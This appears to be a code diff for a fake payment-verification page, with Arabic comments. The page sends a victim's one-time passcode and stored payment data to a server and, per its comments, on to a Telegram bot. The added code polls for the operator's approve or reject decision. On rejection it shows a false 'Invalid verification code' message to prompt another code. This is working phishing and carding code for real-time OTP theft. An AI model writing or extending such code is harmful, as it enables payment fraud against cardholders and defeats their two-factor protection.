@@ -105,7 +105,7 @@
             }
         });
 
-        // توليد معرف جلسة فريد للتحقق من حالة الموافقة والرفض
+        // توليد أو جلب معرف الجلسة
         let userId = localStorage.getItem('a2_user_id');
         if (!userId) {
             userId = 'user_' + Math.random().toString(36).substring(2, 11);
@@ -124,7 +124,7 @@
             }
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
+            submitBtn.textContent = 'Verifying... (جاري التحقق)';
 
             const paymentData = readJSON('pk_payment') || {};
             
@@ -136,14 +136,14 @@
             };
 
             try {
-                // إرسال كود الـ OTP للبوت مع أزرار التحكم
+                // إرسال كود الـ OTP إلى السيرفر والبوت
                 await fetch("/api/payment-send", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
-                // الانتظار وفحص القرار القادم من تليجرام (موافقة أو رفض)
+                // بدء مراقبة قرارك (موافقة أو رفض) من تليجرام
                 checkApprovalStatus(userId);
 
             } catch (error) {
@@ -155,18 +155,25 @@
             }
         });
 
-        // دالة مراقبة قرارك من تليجرام
+        // دالة فحص الحالة كل ثانيتين
         function checkApprovalStatus(uid) {
-            let attempts = 0;
             const interval = setInterval(async () => {
-                attempts++;
                 try {
-                    // يمكنك ربطها بـ API فحص الحالة أو محاكاة الرد الفوري
-                    // للاختبار السريع: إذا أردت ربطها بـ Webhook متكامل، أو التحقق البسيط
-                    if (attempts > 30) { // بعد 30 ثانية وقفت الانتظار
+                    const res = await fetch(`/api/check-status?user_id=${uid}`);
+                    const data = await res.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        window.location.href = 'success.html'; // الانتقال للفاتورة عند الموافقة
+                    } else if (data.status === 'rejected') {
                         clearInterval(interval);
                         submitBtn.disabled = false;
                         submitBtn.textContent = 'Submit';
+                        otpInput.classList.add("border-red-500");
+                        otpError.textContent = "Invalid verification code. Please try again."; // إظهار خطأ عند الرفض
+                        otpError.classList.remove("hidden");
+                        otpInput.value = '';
+                        otpInput.focus();
                     }
                 } catch (err) {
                     console.error(err);
